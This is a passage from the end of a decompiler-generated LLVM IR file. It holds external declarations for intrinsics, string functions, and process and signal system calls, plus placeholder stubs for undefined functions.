42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 281, 282, 283, 284, 285, 291, 292, 293, 296, 297, 298, 301, 302, 303, 304, 307, 308, 309, 310, 380, 381, 382, 383 }
}

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare i32 @_strlen(i8*) local_unnamed_addr

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i32 @_strncmp(i8*, i8*, i32) local_unnamed_addr

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @vfork() local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork(i32) local_unnamed_addr

declare i32 @getpid(i32) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @pipe([2 x i32]) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @setsid(i32) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @execve(i8*, [1 x i8*], [1 x i8*]) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8* @__decompiler_undefined_function_1() local_unnamed_addr

declare i8 @__decompiler_undefined_function_2() local_unnamed_addr

declare i64 @__decompiler_undefined_function_3() local_unnamed_addr

declare i16 @__decompiler_undefined_function_4() local_unnamed_addr

declare i16* @__decompiler_undefined_function_5() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_6() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_7() local_unnamed_addr

declare %timespec* @__decompiler_undefined_function_8() local_unnamed_addr

declare x86_fp80 @__decompiler_undefined_function_9() local_unnamed_addr

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
